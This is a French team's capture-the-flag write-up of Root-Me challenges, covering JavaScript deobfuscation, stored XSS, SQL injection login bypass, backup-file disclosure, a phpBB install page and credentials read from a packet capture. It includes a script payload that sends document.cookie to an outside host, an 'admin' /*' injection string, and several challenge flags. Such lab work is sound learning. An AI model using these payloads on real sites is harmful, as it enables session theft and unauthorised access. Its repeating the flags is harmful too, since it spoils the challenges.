# RootMe
RootMe du groupe Gabriel C, Benjamin D et Romain M


Challenge client web

Javascript - Obfuscation 3

Première tentative :

Essayer différents password de base :
-admin -0000 -1234 -motdepasse -code
Idée non concluante  

Deuxième tentative :

Regarder dans le code et je me rend compte que dans tout les cas il indique que le mdp est faux dans il faut rentrer le mdp directement sur la page daceuil .
Lecture de la ligne : « var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65"; »
Essaie des différents chiffres en tant que mot de passe.
Idée non concluante  

Troisième tentative :

Lecture de la ligne : » p += String.fromCharCode((o = tab2[i])); »
Le « fromCharCode » prouve qu’il y a une conversion d’un type de caractère dans un tableau
Le seul tableau qui me vient a l’esprit c’est la table d’ascii
Je passe cette ligne de nombre dans le tableau et le rentre dans le mot de passe.
« "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65" »
Idée non concluante  

Quatrième tentative :

Je prends cette ligne et fait pareil.
\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30
Idée non concluante  

Cinquième tentative :

Puis je sélectionne cette ligne et je commence à le convertir en décimal car généralement le code son en décimal.
 « \x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30 »
On obtient 55,56,54,79,115,69,114,116,107,49,5 ce n’est pas le mdp.
Idée non concluante  

Sixième tentative :


Je décide donc d’analyser et d’effectuer un 
console.log(String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50)); » et cela nous donne donc le mdp.
Ce qui donne : 786OsErtk12. 
Chalenge réussi 


XSS - Stockée 1

Première tentative : 

Je regarde dans le code au cas où mais il y a aucun indice contenant le mdp mais je remarque que le champ texte est vulnérable à des injections de balise HTML et permet ainsi l'injection de code. Alors je fais un test en mettant <script>Alert.alert(« yo »)<script> et je suis sur la bonne piste car il affiche un pop-up donc le champ de texte est bien vulnérable à l’ingestion de code.

Bonne piste alors je continue 

Grâce au site : Inspecter les | de requête HTTP Inspecteur de demande (requestinspector.com)
Je peux inspecter les requêtes et obtenir les cookies
  
J’écris cette commande dans le contenue du message est envoie le message :

« <script>window.location="http://sandbox-209707.appspot.com/" + document.cookie;</script> »
Puis inspecter les logs du site et je tombe sur ça :
![image](https://user-images.githubusercontent.com/91453648/168331861-df322ad8-bc99-4691-a964-0e6e18097df6.png)
 

Chalenge réussi 

SQL injection - Authentification
Première tentative :

Essayer différents password de base :
-admin -0000 -1234 -motdepasse -code
On obtient alors une erreur avec le mot clés "near".
Idée non concluante  

Deuxième tentative :

Comme la base de données est une base sql on peux essayer de mettre une balise de commentaire « */ » pour que ca ne prenne pas en compte le contenue de ce commentaire.
Login :  « admin ‘/**/ » 
« ‘ » est ici car c’est username`='XXXX’
Idée non concluante

Troisième tentative :  

Essayer de laisser ouvert la ligne de commentaire pour « supprimer » le mdp ?
Ce qui donnerai « admin' /* » et en mdp n’importe quoi car c’est en commentaire.
Il suffit d’utiliser le même mdp pour valider le défis.

Chalenge réussi 



Web serveur: 

Fichier de sauvegardes :

Le challenge nous mène sur une page dont l’url est la suivante : 
« http://challenge01.root-me.org/web-serveur/ch11/ »

On ajoute à la fin de cet URL “index.php~” qui va donc nous permettre de visualiser le contenu du fichier. 
![image](https://user-images.githubusercontent.com/91453648/168332121-e5dc629e-727d-4434-ad91-3ae41202d57a.png)


Le mot de passe est donc apparent dans le fichier. 
La solution est   “OCCY9AcNm1tj”.



Install Files:

En observant le code source de la page, on trouve ceci : 

 ![image](https://user-images.githubusercontent.com/91453648/168332158-95e5a11e-aa34-4db1-8a54-6eb50c7fd33a.png)


Après quelque recherche sur google sur phpbb, je suis tombé sur ca: 

 ![image](https://user-images.githubusercontent.com/91453648/168332174-110e093d-9d93-4117-80ee-356c806e774c.png)


J’ai donc ajouté à l’url phpbb/install/ puis suis arrivé sur la page ci-dessous. 

 ![image](https://user-images.githubusercontent.com/91453648/168332190-a04e8a58-788c-4098-8c00-1945b7e8ae60.png)


Après avoir installé le fichier “install.php”, on obtient le message suivant : 


![image](https://user-images.githubusercontent.com/91453648/168332199-883d6367-11d1-4d8b-832c-fccb3eabf516.png)








Réseaux: 

Authentification twitter :

On récupère le document “ch3.pcap” et on l’ouvre avec wireshark. 

On va dans Hypertext Transfer Protocol, puis dans Autorization, ou il y a les lignes Credentials : usertest:password 

Le mot de passe est donc “password”.


